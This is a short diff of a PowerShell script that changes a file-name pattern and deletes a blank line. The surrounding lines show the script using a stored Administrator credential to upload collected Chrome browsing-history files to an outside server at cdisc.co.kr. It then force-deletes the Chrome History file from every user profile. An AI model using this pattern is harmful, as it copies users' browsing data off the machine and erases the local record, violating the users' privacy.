@@ -12,7 +12,7 @@
         $enc = Get-Content C:\Windows\enp.txt | ConvertTo-SecureString # specify the directory where the encrypted password file is located
         $user = "Administrator" # server ID
         $cred = New-Object System.Management.Automation.PSCredential($user,$enc)
-        $src = "C:\ProgramData\soalog\*_Chrome_History"
+        $src = "C:\ProgramData\soalog\*_ChromeHistory"
         Get-ChildItem -path $src |
         foreach {
         $dst = "http://cdisc.co.kr:1024/soa/upload/$($_.name)" # server directory with write permissions
@@ -32,7 +32,6 @@
 
     Remove-Item -Path 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\History' -Force
 }
-
 
 $ErrorActionPreference = 'silentlycontinue'
 if(!(test-path 'C:\ProgramData\soalog'))
